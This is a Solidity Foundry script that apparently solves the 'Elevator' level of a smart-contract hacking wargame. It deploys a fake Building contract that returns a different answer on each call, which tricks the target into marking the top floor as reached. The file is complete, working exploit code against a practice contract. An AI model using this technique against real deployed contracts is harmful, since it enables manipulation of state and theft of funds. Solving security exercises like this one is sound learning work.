// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level11Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FakeBuilding {
    Elevator elevatorInstance;
    uint check = 0;

    constructor (Elevator _elevatorInstance) {
        elevatorInstance = _elevatorInstance;
    }

    function attack() public {
        elevatorInstance.goTo(0);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (check == 0) {
            check = 1;
            return false;
        }

        return true;
    }
}

contract Level11ElevatorSolution is Script {
    Elevator elevatorInstance = Elevator(0x19fd513712D6856198325B5fadaADBC0A9C94888);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Top: ", elevatorInstance.top());
        FakeBuilding fakebuildingInstance = new FakeBuilding(elevatorInstance);
        fakebuildingInstance.attack();
        console.log("Top: ", elevatorInstance.top());

        vm.stopBroadcast();
    }
}